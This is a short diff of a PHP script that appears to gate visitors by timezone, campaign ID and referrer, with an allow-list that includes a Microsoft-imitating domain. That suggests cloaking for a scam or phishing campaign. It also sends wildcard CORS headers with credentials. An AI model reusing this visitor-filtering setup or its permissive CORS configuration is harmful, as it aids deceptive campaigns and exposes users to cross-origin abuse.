@@ -1,17 +1,20 @@
 <?php
+error_reporting(0);
+// error_reporting(E_ALL);
+// ini_set('display_errors', '1');
+
 $dynamic_url = "https://wavesofjapanblog.site";
-#$dynamic_url = "http://127.0.0.1:8080";
+$dynamic_url = "http://127.0.0.1:800";
 
 $allowed_timezones = ['Asia/Tokyo'];
 $allowed_campaign_ids = ['12345', '67890'];
-$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space','https://sunaloomblog.space', 'https://microsoftx10.onrender.com'];
+$allowed_referrer = ['http://127.0.0.1', 'http://127.0.0.1:81', 'https://waveharborblog.space','https://sunaloomblog.space', 'https://microsoftx10.onrender.com'];
 
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type");
 header("Access-Control-Allow-Credentials: true");
 
-error_reporting(0);
 $rawInput = trim(file_get_contents('php://input'));
 if ($rawInput !== '') {
     $inputData = json_decode($rawInput, true);
